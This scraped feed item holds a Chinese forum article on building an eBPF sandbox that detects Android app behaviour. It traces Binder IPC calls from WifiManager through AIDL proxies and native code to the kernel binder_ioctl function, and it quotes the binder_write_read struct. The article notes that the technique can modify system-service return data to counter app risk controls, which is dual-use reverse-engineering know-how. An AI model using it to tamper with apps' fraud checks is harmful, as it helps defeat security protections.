Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1918788-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 29 Apr 2024 15:15:36 +0800</pubDate>
</item>
<item>
<title>ebpf在Android安全上的应用：结合binder完成一个行为检测沙箱(下篇)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140600&amp;idx=1&amp;sn=f0161296c1a102ae251fb3346709d387&amp;chksm=bd50a1ac8a2728ba58d95b4478fd1080a2e50a89ae57517592b5e82db5270120af11a5dc38b5&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140600&amp;idx=1&amp;sn=f0161296c1a102ae251fb3346709d387&amp;chksm=bd50a1ac8a2728ba58d95b4478fd1080a2e50a89ae57517592b5e82db5270120af11a5dc38b5&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> IPC是Android中的进程间通信技术，用于实现不同进程之间的数据交换。Android在请求系统服务时会需要跨进程通信。<br />
Binder是Android中实现IPC的一种方式，ServiceManager是管理系统服务的重要组件。ServiceManager负责注册、查找服务、进程间通信等功能。<br />
客户端在调用系统服务时，会首先通过Java层的代码发起调用，然后通过BinderProxy进行跨进程通信到Native层。<br />
在Native层，跨进程通信会通过Binder驱动进行处理，最终发起到内核层的通信。<br />
在内核层，使用binder_ioctl处理跨进程通信的数据包，最终交互到目标进程。<br />
实现的效果可以用于捕捉系统服务的调用和返回数据，甚至修改返回数据，用于风控对抗或逆向工作。<br /> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-04-26 09:26</span> <span style="display: inline-block;">北京</span>
</p>

<p>IPC是Inter-Process Communication的缩写，含义为进程间通信或者跨进程通信，是指两个进程之间进行数据交换的过程。Android在什么时候会有跨进程通信的需要？</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=0ca325f2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6vVoibP4zzgRcfCDI1GJOZALjo7MG3lEkVxJc4zPRPbA3BsYqib4AsHhg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>windy_ll</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><h2>一、IPC简单介绍</h2><p><span style="font-weight: 700;">IPC是Inter-Process Communication的缩写，含义为进程间通信或者跨进程通信，是指两个进程之间进行数据交换的过程。</span></p><p><span style="font-weight: 700;">Android在什么时候会有跨进程通信的需要？Android在请求系统服务的时候会有跨进程通信的需求，例如访问手机通讯录、获取定位等等行为，本文的目标即是实现一个简易的捕捉这些行为的沙箱</span></p><hr /><h2>二、binder简单介绍</h2><p><span style="font-weight: 700;">Binder是Android中的一种跨进程通信方式，可以理解为是IPC的一种具体实现方式</span></p><hr /><h2>三、ServiceManager简单介绍</h2><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">ServiceManager</code>是Android中一个及其重要的系统服务，从它的名称上就可以知道，它是用于管理系统服务的</span></p><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">ServiceManager</code>由<code style="font-family: Consolas, Monaco, ;">init</code>进程启动</span></p><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">ServiceManager</code>负责了以下的一些功能：服务的注册与查找、进程间通信、系统服务的启动与唤醒、提供系统服务的清单实例</span></p><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">binder</code>驱动决定了底层的通信详情，那么<code style="font-family: Consolas, Monaco, ;">ServiceManager</code>则相当于导航，告诉具体的通信该怎么走，达到那里等</span></p><hr /><h2>四、通信分析</h2><h3>4.1 客户端调用JAVA层分析</h3><p><span style="font-weight: 700;">以<code style="font-family: Consolas, Monaco, ;">WifiManager</code>类的<code style="font-family: Consolas, Monaco, ;">getConnectInfo</code>函数(该函数获取wifi信息)为例进行分析</span></p><p><span style="font-weight: 700;"><code style="font-family: Consolas, Monaco, ;">ctrl+左键</code>查看引用，可以发现该函数定义在<code style="font-family: Consolas, Monaco, ;">android.net.wifi.WifiManager</code>类中，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=50452f9d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6TmBDBqnEknFcK8XGcoE98tcQ9ZHlvBicW7JhrpTNTaTtdXTzDXXKibZg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="664" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a1ffd555&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV62SbDUFNWqThWz9EW18WSq0UmzDtfeEbTrNYj1kcfATMdlWraLUkiawQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">从上图可以看到，<code style="font-family: Consolas, Monaco, ;">getConnectInfo</code>函数具体代码只有一句<code style="font-family: Consolas, Monaco, ;">throw new RuntimeException("Stub!");</code>，这告诉我们这个函数是由rom中相同的类去替代执行，该函数在这被定义是编译所需要(PS:可以参考https://blog.csdn.net/ttkatrina/article/details/76180641)，在android源码中的目录<code style="font-family: Consolas, Monaco, ;">frameworks/base/wifi/java/amdroid/net/wifi</code>下我们可以找到该类，然后找到该函数的具体实现，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=9585ccd3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6U6HHcrYibK6zPclhIiaibHkdMBNM85W4AcCkxLInbmiaSsFZdlkBV6Izsw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">可以发现该函数调用了<code style="font-family: Consolas, Monaco, ;">IWifiManager</code>的<code style="font-family: Consolas, Monaco, ;">getConnectionInfo</code>函数，在<code style="font-family: Consolas, Monaco, ;">frameworks/base/wifi/java/amdroid/net/wifi</code>目录下可以找到<code style="font-family: Consolas, Monaco, ;">IWifiManager.aidl</code>文件，该aidl中定义了<code style="font-family: Consolas, Monaco, ;">getConnectionInfo</code>函数，如下图所示：</span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=47d7d6dc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV60BF3WohUutZBrUqWFnvtjds0Nzv9Ho1FWU4ibttSSARoD1mYNphluSg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ad25866a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6KuLPSz37GAQokHhNzkrmZjISXYWKgQ75PicLp4YskFF2eE3JxVlmPsQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="798" /></p><p><br /></p><p><span style="font-weight: 700;">这里需要引入一个概念 --- <code style="font-family: Consolas, Monaco, ;">AIDL</code>，<code style="font-family: Consolas, Monaco, ;">AIDL</code>是android的一种接口语言，用于公开android服务的接口，以此来实现跨进程的函数调用。<code style="font-family: Consolas, Monaco, ;">AIDL</code>在编译时会生成两个类，即<code style="font-family: Consolas, Monaco, ;">Stub</code>和<code style="font-family: Consolas, Monaco, ;">Proxy</code>两个类，<code style="font-family: Consolas, Monaco, ;">Stub</code>类是服务端抽象层的体现，<code style="font-family: Consolas, Monaco, ;">Proxy</code>是客户端获取的实例，android通过<code style="font-family: Consolas, Monaco, ;">proxy-stub</code>这种设计模式实现了IPC</span></p><p><span style="font-weight: 700;">下面写一个aidl文件然后生成相应的java代码来看看是怎么实现调用的，首先，我们在android studio中随便找一个项目，然后新建一个aidl文件，如下图所示：</span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=9f0f34cb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6Lb9sPdaLu7BZbqHpJRAVGlKbMBXSaC18zfypSXMM3B1p43TiaorYiaSQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="952" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=52fde55d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6icwQn72Uxu3syVX4o6SCJoeLDy83s6DuiaGD9icC0AWIMTBM6xmRgicOcg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="830" /></p><p><br /></p><p><span style="font-weight: 700;">然后<code style="font-family: Consolas, Monaco, ;">Build-&gt;Make Probject</code>即可生成，生成的路径位于<code style="font-family: Consolas, Monaco, ;">build/generated/aidl_source_output_dir/debug/out/包名</code>，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=18d6ca5e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6MEsBicR74Hldu7TfOc34mEGF7dh5MicrEXVOxafAGBUhcBiaRUjhpnHOg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="609" /></p><p><br /></p><p><span style="font-weight: 700;">观察生成后的java文件可发现，<code style="font-family: Consolas, Monaco, ;">Proxy</code>类已经生成，在<code style="font-family: Consolas, Monaco, ;">Proxy</code>类中我们可以找到我们定义的函数，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=66f9414f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6L3z05u54iaIoedRmZO16bAib81hR78LWrVyHBG6wrHkfQibWgMXFiarib9w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">具体分析一下该函数，首先通过<code style="font-family: Consolas, Monaco, ;">obtain</code>函数生成了一个<code style="font-family: Consolas, Monaco, ;">Parcel</code>实例，然后调用<code style="font-family: Consolas, Monaco, ;">Parcel</code>的<code style="font-family: Consolas, Monaco, ;">write</code>系列函数进行写入，其实就是一个序列化的过程，然后调用了<code style="font-family: Consolas, Monaco, ;">IBinder</code>的<code style="font-family: Consolas, Monaco, ;">transact</code>函数，跟踪分析一下该函数，在目录<code style="font-family: Consolas, Monaco, ;">frameworks/base/core/java/android/os</code>下可以找到该java文件，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f82e1e6a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6Fcgw2sB4LlrQPwAzAVnXnbNgaV59dovpPn19rwYGAnckIiagjrdOb0A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=bb968e35&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV68Qa3Gym4BNT6qfIUUldCibu6WDplACHhGiasVcVTpoHHeRxUnD0ASPxw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">可以发现，<code style="font-family: Consolas, Monaco, ;">IBinder</code>仅仅是一个接口，其中定义了<code style="font-family: Consolas, Monaco, ;">transact</code>方法，该方法有4个参数，第一个参数<code style="font-family: Consolas, Monaco, ;">code</code>在我们的远程调用中为函数编号，服务端接受到这个编号后，会去寻找<code style="font-family: Consolas, Monaco, ;">Stub</code>类中的静态变量，从而解析出是调用那个函数，第二个和第三个参数<code style="font-family: Consolas, Monaco, ;">_data</code>、<code style="font-family: Consolas, Monaco, ;">_reply</code>为传入的参数和返回的值，都是经过序列化后的数据，最后一个参数<code style="font-family: Consolas, Monaco, ;">flags</code>为指示是否需要阻塞等待结果，0为阻塞等待，1为立即返回。</span></p><p><span style="font-weight: 700;">全局搜索一下，可以发现同目录下的<code style="font-family: Consolas, Monaco, ;">BinderProxy</code>类实现了该接口(PS:值得注意的是，同目录下面还存在一个<code style="font-family: Consolas, Monaco, ;">Binder</code>类，也实现了该接口，但<code style="font-family: Consolas, Monaco, ;">Binder</code>类是服务端的实现，而不是客户端的实现)，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=7dd4a82c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6WcjU8keZOCYLp77JwfqgpYibSUBXU3Eey6rvSI1qbyPiauoKHsoaCRHg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f667b09e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6swkGiciae3UDOj5LvBkwSnEd8vNfXmibGiayIP2WxNBLfG4vZTcibvTwBJw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">分析该函数，可以发现最后走向了<code style="font-family: Consolas, Monaco, ;">transactNative</code>函数，到此为止，进行IPC通信客户端java层已经分析完毕</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0cfadefd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6IF2coiaOLKOAiagBAVMRVTgsKYyhrUNs5ltibfhUD9kkv7aRm9YYV7mtA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="898" /></p><p><br /></p><h3>4.2 客户端调用Native层分析</h3><p><span style="font-weight: 700;">全局搜索一下<code style="font-family: Consolas, Monaco, ;">transactNative</code>函数，可以发现该函数在native层中注册信息，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=1bdf6f7a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6cZIBNrZjYVG7Jo61NE7qSg4BiaqgLjXH3wnLoOBK0ugr1nTbsdnMnJg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">跟踪一下<code style="font-family: Consolas, Monaco, ;">android_os_BinderProxy_transact</code>函数，可以发现该函数首先通过<code style="font-family: Consolas, Monaco, ;">getBPNativeData(env, obj)-&gt;mObject.get()</code>获取到了一个<code style="font-family: Consolas, Monaco, ;">BpBinder</code>对象，然后调用了<code style="font-family: Consolas, Monaco, ;">BpBinder</code>的<code style="font-family: Consolas, Monaco, ;">transact</code>函数，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=fa24512e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6Tianh2fChN1ENXGOThVMlAzlZxc1nG25ficVTqDM5vTM33yLya6oLtibw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=0c122e0b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6YT9UeNxPs8eS69KQJ8UHzHwHWQuvhc5r29baxfBzMHRs1uCdoaXlIw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">继续跟进下去，可以发现进入了<code style="font-family: Consolas, Monaco, ;">IPCThreadState</code>的<code style="font-family: Consolas, Monaco, ;">transact</code>函数，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2ee26f38&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6AHp2ibvmyzJluJZD5c6IONkQjn11yPfUH4n3oaQffcfbib2SWbBiaKOmw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="885" /></p><p><br /></p><p><span style="font-weight: 700;">接着跟进，可以发现首先调用<code style="font-family: Consolas, Monaco, ;">writeTransactionData</code>函数，该函数作用为填充<code style="font-family: Consolas, Monaco, ;">binder_transaction_data</code>结构体，为发送到binder驱动做准备，然后调用<code style="font-family: Consolas, Monaco, ;">waitForResponse</code>等待返回，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=584f1416&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6sIjK0wHpsuPALDLvVNZRYqwTiaPcFdLLOMYOvY77KA6Yd9h9qZTjnibg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=5b1c79a5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6Z8ev4uiaD6GsH5EicLrTSe0FibK5p2diciawnUyN4A9OfSKoTKSh9kOb73Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0522596a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6PZwy7aqnRWhCdHPlYysMGETp4nU1SzMVRH1DjxnYdQeibt8JicJgvUkg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">跟进<code style="font-family: Consolas, Monaco, ;">waitForResponse</code>函数，可以发现该函数最重要的就是调用<code style="font-family: Consolas, Monaco, ;">talkWithDriver</code>函数，分析一下<code style="font-family: Consolas, Monaco, ;">talkWithDriver</code>函数，可以发现最终调用了<code style="font-family: Consolas, Monaco, ;">ioctl</code>，如下图所示：</span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=64a85db7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6NV6VDNHXQ9w7ZuZ3j1g4s2RVhP4UG4EMuicOibC5GkDVBQkibLvxyyia0A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=939f8a63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6XP01XtYSNaZJ4C2fLVUbv5knlzst88R3q8kHG8SQmrEIialeDs4ry5w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">到处为止，客户端native层分析完毕</span></p><h3>4.3 内核层分析(binder驱动分析)</h3><p><span style="font-weight: 700;">到此处，我们的ebpf程序就可以开始捕捉然后解析数据格式了</span></p><p><span style="font-weight: 700;">当用户层调用<code style="font-family: Consolas, Monaco, ;">ioctl</code>时，会进入内核态，进入<code style="font-family: Consolas, Monaco, ;">binder_ioctl</code>内核函数(ps:可在内核设备源码中的<code style="font-family: Consolas, Monaco, ;">binder.c</code>找到相应的描述符)，分析一下<code style="font-family: Consolas, Monaco, ;">binder_ioctl</code>函数，可发现该函数主要作用为在两个进程之间首发数据，我们的通信数据<code style="font-family: Consolas, Monaco, ;">ioctl</code>命令是<code style="font-family: Consolas, Monaco, ;">BINDER_WRITE_READ</code>，当遇到该命令的时候，会调用<code style="font-family: Consolas, Monaco, ;">binder_ioctl_write_read</code>函数，如下图所示：</span></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=e44c5a07&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6x6QdVqbCSZdbibyeWtCJxWkZQFCcdZE6cNrtYR6vXm0ylhSib3k3A9ag%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="863" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=dc755344&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6rfo4pTVL8MZn3TcyfNACpUXiaDCzVWuP7L3PuoibIJ876gBDSt4WSWkA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">跟进<code style="font-family: Consolas, Monaco, ;">binder_ioctl_write_read</code>函数，可以发现，该函数首先将<code style="font-family: Consolas, Monaco, ;">unsigned long</code>类型的<code style="font-family: Consolas, Monaco, ;">arg</code>参数指向的地址的值读取到结构体<code style="font-family: Consolas, Monaco, ;">binder_write_read</code>中，说明当<code style="font-family: Consolas, Monaco, ;">ioctl</code>命令为<code style="font-family: Consolas, Monaco, ;">BINDER_WRITE_READ</code>时，传递进来的参数为指向结构的<code style="font-family: Consolas, Monaco, ;">binder_write_read</code>的指针，如下图所示：</span></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=5d016e31&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKXemdwFQE5PZgOGQw9oHV6pq9SaGIibJxD1xdiaBXw15zvM5c5ibTLHXX5VrIJyOWjzMSKlKYOAVFzw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><span style="font-weight: 700;">到这里其实我们内核态的分析已经可以结束了，我们已经观察到了我们想要的数据了，即<code style="font-family: Consolas, Monaco, ;">binder_write_read</code>结构体，可以看一下该结构体的定义，如下所示：</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">binder_write_read</span> {<br />    <span style="color: rgb(255, 255, 182);">binder_size_t</span> write_size; <span style="color: rgb(146, 255, 184);">/* 写内容的数据总大小 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_size_t</span> write_consumed; <span style="color: rgb(146, 255, 184);">/* 记录了从缓冲区读取写内容的大小 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_uintptr_t</span> write_buffer; <span style="color: rgb(146, 255, 184);">/* 写内容的数据的虚拟地址 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_size_t</span> read_size; <span style="color: rgb(146, 255, 184);">/* 读内容的数据总大小 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_size_t</span> read_consumed; <span style="color: rgb(146, 255, 184);">/* 记录了从缓冲区读取读内容的大小 */</span><br />    <span style="color: rgb(255, 255, 182);">binder_uintptr_t</span> read_buffer; <span style="color: rgb(146, 255, 184);">/* 读内容的数据的虚拟地址 */</span><br />};</code></pre><p><span style="font-weight: 700;">这个结构体是用来描述进程间通信过程中所传输的数据，我们读取从客户端发送到服务端的通信包只需要关注<code style="font-family: Consolas, Monaco, ;">write_size</code>、<code style="font-family: Consolas, Monaco, ;">write_consumed</code>、<code style="font-family: Consolas, Monaco, ;">write_buffer</code>，其中，<code style="font-family: Consolas, Monaco, ;">write_buffer</code>指向的是一个数组，这个数组中就包含了<code style="font-family: Consolas, Monaco, 